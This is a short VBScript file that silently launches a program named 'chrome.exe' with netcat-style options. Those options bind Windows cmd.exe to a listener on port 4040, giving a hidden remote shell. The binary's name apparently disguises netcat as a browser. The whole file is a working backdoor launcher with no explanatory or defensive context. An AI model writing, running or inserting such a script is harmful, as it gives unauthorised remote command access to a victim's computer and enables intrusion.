Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:/chrome.exe -nvlp 4040 -e cmd.exe" & Chr(34), 0
Set WshShell = Nothing